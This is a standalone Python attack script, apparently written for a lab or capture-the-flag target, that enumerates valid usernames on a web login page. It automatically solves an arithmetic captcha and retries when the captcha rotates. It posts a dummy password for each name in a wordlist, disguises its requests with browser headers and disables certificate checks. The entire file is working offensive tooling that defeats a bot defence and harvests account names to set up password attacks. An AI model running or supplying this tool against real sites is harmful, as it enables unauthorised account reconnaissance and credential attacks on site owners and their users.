#!/usr/bin/env python3

import requests
import re
import sys
import argparse
import html
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def solve_captcha(captcha_text: str) -> str | None:
    """Parse and solve a simple arithmetic captcha. Supports +, -, *, /"""
    match = re.search(r'(-?\d+)\s*([\+\-\*\/x×÷])\s*(-?\d+)\s*=', captcha_text)
    if not match:
        return None

    a = int(match.group(1))
    op = match.group(2)
    b = int(match.group(3))

    if op == '+':
        result = a + b
    elif op == '-':
        result = a - b
    elif op in ('*', 'x', '×'):
        result = a * b
    elif op in ('/', '÷'):
        if b == 0:
            return None
        result = a // b
    else:
        return None

    return str(result)


def extract_captcha(html_text: str) -> str | None:
    """Extract arithmetic captcha expression from HTML."""
    soup = BeautifulSoup(html_text, 'html.parser')
    text = soup.get_text(separator=' ')
    match = re.search(r'(-?\d+\s*[\+\-\*\/x×÷]\s*-?\d+\s*=\s*\?)', text)
    if match:
        return match.group(1)
    return None


def probe(session: requests.Session, url: str, username: str) -> str | None:
    """
    GET the login page, solve any captcha, POST with a dummy password.
    Retries once if the captcha rotates between GET and POST.
    Returns response text or None on network error.
    """
    base_origin = url.rsplit('/', 1)[0] if '/' in url.replace('://', '') else url

    try:
        get_resp = session.get(url, timeout=10, verify=False)

        captcha_answer = None
        if 'captcha' in get_resp.text.lower():
            expr = extract_captcha(get_resp.text)
            if expr:
                captcha_answer = solve_captcha(expr)

        payload = {'username': username, 'password': 'invalid_placeholder'}
        if captcha_answer is not None:
            payload['captcha'] = captcha_answer

        post_headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': base_origin,
            'Referer': url,
        }

        resp = session.post(url, data=payload, headers=post_headers,
                            timeout=10, verify=False, allow_redirects=True)

        # Captcha may rotate between GET and POST — retry once with fresh answer
        if 'invalid captcha' in resp.text.lower():
            expr = extract_captcha(resp.text)
            if expr:
                payload['captcha'] = solve_captcha(expr)
                resp = session.post(url, data=payload, headers=post_headers,
                                    timeout=10, verify=False, allow_redirects=True)

        return resp.text

    except requests.RequestException as e:
        print(f"\n[!] Request error for '{username}': {e}")
        return None


def enumerate_users(url: str, userlist_path: str) -> list[str]:
    """
    Probe each username and collect those that exist.
    A user is valid when the response does NOT contain
    "The user '<username>' does not exist".
    """
    try:
        with open(userlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            usernames = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {userlist_path}")
        sys.exit(1)

    print(f"[*] Target   : {url}")
    print(f"[*] Wordlist : {userlist_path} ({len(usernames)} entries)")
    print("-" * 60)

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,'
                  'image/avif,image/webp,image/apng,*/*;q=0.8,'
                  'application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
    })

    valid_users: list[str] = []
    total = len(usernames)

    for idx, username in enumerate(usernames, start=1):
        print(f"\r[*] Checked: {idx}/{total}", end='', flush=True)

        resp_text = probe(session, url, username)
        if resp_text is None:
            continue

        not_found_phrase = f"The user '{username}' does not exist"
        if not_found_phrase not in html.unescape(resp_text):
            print(f"\n[+] Valid user: {username}")
            valid_users.append(username)

    print(f"\n{'─' * 60}")
    if valid_users:
        print(f"[*] Found {len(valid_users)} valid user(s).")
    else:
        print("[*] No valid users found.")

    return valid_users


def main():
    parser = argparse.ArgumentParser(
        description="Username enumeration with arithmetic captcha solver."
    )
    parser.add_argument('url',
        help="Target login URL (e.g. http://10.49.173.171/login)")
    parser.add_argument('wordlist',
        help="Path to username wordlist (one per line)")
    parser.add_argument('-o', '--output',
        help="Save found usernames to this file")

    args = parser.parse_args()

    found = enumerate_users(url=args.url, userlist_path=args.wordlist)

    if args.output and found:
        with open(args.output, 'w') as f:
            f.write('\n'.join(found) + '\n')
        print(f"[*] Results saved to: {args.output}")


if __name__ == '__main__':
    main()